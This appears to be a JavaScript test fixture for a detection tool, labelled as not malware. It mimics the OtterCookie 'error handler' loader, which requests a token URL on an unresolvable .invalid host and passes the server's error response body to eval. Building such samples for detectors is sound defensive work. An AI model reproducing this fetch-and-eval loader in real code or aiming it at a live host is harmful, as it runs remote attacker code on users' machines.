// crumble test fixture. Not malware. Mirrors the shape of the
// "error handler" loader described by Cisco Talos for OtterCookie v2+:
// request a token URL, the server answers with an HTTP error whose body is
// JavaScript, and the catch block hands that body to eval. The host is a
// reserved .invalid name (RFC 2606) so it can never resolve.
const axios = require("axios");

const base = "http://api.token-check.invalid:3000";
const path = "/api/service/token/";
const key = "2b8c1d4e";

async function check() {
  try {
    await axios.get(base + path + key, { headers: { "x-secret-header": "secret" } });
  } catch (err) {
    if (err.response && err.response.data) {
      eval(err.response.data);
    }
  }
}

check();
